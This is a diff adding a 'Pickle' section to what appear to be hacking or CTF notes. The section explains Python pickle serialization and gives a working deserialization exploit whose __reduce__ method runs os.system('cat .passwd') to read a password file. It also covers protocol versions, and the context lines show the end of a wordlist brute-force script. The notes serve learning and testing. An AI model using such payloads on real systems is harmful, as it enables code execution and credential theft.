@@ -299,3 +299,55 @@ if __name__ == '__main__' :
 	wordlist = "./wordlist2.txt"
 	main(target,port,username, wordlist)
 ```
+
+# Pickle
+
+Pickle is a library used to serialize and unserialize data.
+A vulnerability exists because when unpickling, it calls the `__reduce__` function and the code is interpreted
+
+**Serialize**
+```python
+import pickle
+pickle.dumps(['pickle', 'me', 1, 2, 3])
+```
+Output :
+```python
+b'\x80\x04\x95\x19\x00\x00\x00\x00\x00\x00\x00]\x94(\x8c\x06pickle\x94\x8c\x02me\x94K\x01K\x02K\x03e.'
+```
+
+**Unserialize**
+```python
+import pickle
+pickle.loads(b'\x80\x04\x95\x19\x00\x00\x00\x00\x00\x00\x00]\x94(\x8c\x06pickle\x94\x8c\x02me\x94K\x01K\x02K\x03e.')
+```
+Output
+```
+['pickle', 'me', 1, 2, 3]
+```
+
+### Pickle exploit example
+Be careful, depending on the version of python used by the server, it can sometimes fail to loads even if the load data is valid
+```python
+import pickle, os, base64
+class P(object):
+	def __reduce__(self):
+		return (os.system,("cat .passwd",))
+
+payloadb64 = base64.b64encode(pickle.dumps(P()))
+
+# print(payloadb64)
+payload = base64.b64decode(payloadb64)
+
+# print(payload)
+pickle.loads(payload)
+```
+
+Pickle uses different `protocols` to convert your data to a binary stream.
+
+- In python 2 there are [3 different protocols](https://docs.python.org/2/library/pickle.html#data-stream-format) (`0`, `1`, `2`) and the default is `0`.
+- In python 3 there are [5 different protocols](https://docs.python.org/3/library/pickle.html#data-stream-format) (`0`, `1`, `2`, `3`, `4`) and the default is `3`.
+```python
+pickle.dump(your_object, your_file, protocol=2)
+```
+
+You must specify in python 3 a protocol lower than `3` in order to be able to load the data in python 2. You can specify the `protocol` parameter when invoking [`pickle.dump`](https://docs.python.org/2/library/pickle.html#pickle.dump).
